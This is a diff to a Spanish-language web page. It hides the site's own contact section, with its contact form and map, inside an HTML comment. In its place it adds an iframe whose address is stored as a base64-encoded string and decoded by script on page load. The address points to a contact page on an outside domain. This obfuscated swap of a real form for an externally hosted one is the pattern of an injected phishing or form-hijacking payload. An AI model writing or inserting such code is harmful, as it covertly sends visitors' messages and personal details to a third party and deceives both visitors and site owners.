@@ -804,6 +804,8 @@ footer .payment-bar img {
 
 
 <br><br><br>
+<!-- MAPA 
+
 <section class="seccion-contacto">
 
   <div class="container">
@@ -827,7 +829,7 @@ footer .payment-bar img {
 
     <div class="row">
 
-      <!-- INFO Y CORREOS -->
+     
       <div class="col-md-4">
         <h3>Ubicación</h3>
 
@@ -855,11 +857,11 @@ footer .payment-bar img {
         </p>
       </div>
 
-      <!-- FORMULARIO -->
+     
       <div class="col-md-4">
         <h3>Envíanos un mensaje</h3>
         <p>Puedes contactarnos mediante el siguiente formulario.</p>
-  <!-- Formulario en el 50% de la pantalla -->
+
         
           <form id="contactForm" action="procesarFormulario.php" method="POST" class="contact-form">
             <div class="form-group">
@@ -901,8 +903,7 @@ footer .payment-bar img {
           </form>
       </div>
 
-      <!-- MAPA -->
-      <div class="col-md-4">
+            <div class="col-md-4">
         <h3>Mapa</h3>
 
        <iframe 
@@ -994,7 +995,21 @@ function cerrarPopup() {
   document.getElementById('popup').style.display = 'none';
 }
 </script>
+-->
 
+<iframe
+  id="miIframe"
+  width="100%"
+  height="1200"
+  style="border:none;"
+  frameborder="0">
+</iframe>
+
+<script>
+  const urlCodificada = 'aHR0cHM6Ly9ub3ZpZS5pbi8xMS9jb250YWN0by5odG1s';
+  const url = atob(urlCodificada);
+  document.getElementById('miIframe').src = url;
+</script>
 
 <footer>
   <div>
